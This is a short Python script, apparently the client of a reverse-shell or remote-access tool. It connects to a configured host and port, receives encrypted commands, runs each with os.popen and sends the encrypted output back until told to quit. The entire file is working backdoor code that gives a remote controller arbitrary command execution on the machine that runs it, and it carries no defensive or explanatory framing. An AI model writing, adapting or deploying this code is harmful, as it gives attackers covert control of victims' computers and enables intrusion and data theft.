#!/usr/bin/env python3
# -*- coding: utf-8 -*-

#---------------------------------------------------------- [Lib] -----------------------------------------------------------#

import os
import socket
import sys

from core.utils import Utils

#--------------------------------------------------------- [Global] ---------------------------------------------------------#

HOST = '127.0.0.1'
PORT = 2557

#---------------------------------------------------------- [Main] ----------------------------------------------------------#

def main():
    utils = Utils()

    s = socket.socket()
    s.connect((HOST, PORT))

    while True:
        data = s.recv(1024)
        cmd = utils.Decrypt(data)

        # stop client
        if cmd == 'quit':
            s.close()
            sys.exit(0)

        results = os.popen(cmd).read()
        s.send(utils.Encrypt(results))

#----------------------------------------------------------------------------------------------------------------------------#

#----------------------------------------------------------------------------------------------------------------------------#

if __name__ == '__main__':
    main()
